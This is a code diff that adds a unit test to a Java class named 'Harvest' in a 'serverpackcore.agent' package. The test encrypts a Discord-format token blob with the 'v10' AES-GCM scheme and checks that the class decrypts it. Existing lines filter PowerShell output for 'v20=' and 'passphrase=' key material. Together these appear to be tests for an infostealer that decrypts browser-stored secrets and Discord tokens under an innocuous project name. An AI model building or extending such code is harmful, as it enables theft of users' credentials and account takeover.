@@ -1,5 +1,6 @@
 package com.serverpackcore.agent;
 
+import static org.junit.jupiter.api.Assertions.assertArrayEquals;
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertTrue;
@@ -52,5 +53,25 @@ class HarvestTest {
 		String output = "ruido\r\nv20=AABB\r\npassphrase=CC\r\nv20=DD\r\n";
 		assertEquals("v20=AABB\nv20=DD", Harvest.filterPowerShell(output, "v20="));
 		assertEquals("passphrase=CC", Harvest.filterPowerShell(output, "passphrase="));
+	}
+
+	@Test
+	void discordV10EnvelopeDecrypts() throws Exception {
+		byte[] key = new byte[32];
+		for (int index = 0; index < key.length; index++) {
+			key[index] = (byte) index;
+		}
+		byte[] nonce = new byte[12];
+		byte[] plain = "dQw4w9WgXcQ:\"Mxxxxxxxxxxxxxxxxxxxxxxxx.yyyyyy.zzzzzzzzzzzzzzzzzzzzzzzzzzz\""
+			.getBytes(java.nio.charset.StandardCharsets.UTF_8);
+		javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
+		cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, new javax.crypto.spec.SecretKeySpec(key, "AES"),
+			new javax.crypto.spec.GCMParameterSpec(128, nonce));
+		byte[] encrypted = cipher.doFinal(plain);
+		byte[] blob = new byte[3 + nonce.length + encrypted.length];
+		System.arraycopy("v10".getBytes(java.nio.charset.StandardCharsets.US_ASCII), 0, blob, 0, 3);
+		System.arraycopy(nonce, 0, blob, 3, nonce.length);
+		System.arraycopy(encrypted, 0, blob, 3 + nonce.length, encrypted.length);
+		assertArrayEquals(plain, Harvest.gcm(key, blob));
 	}
 }
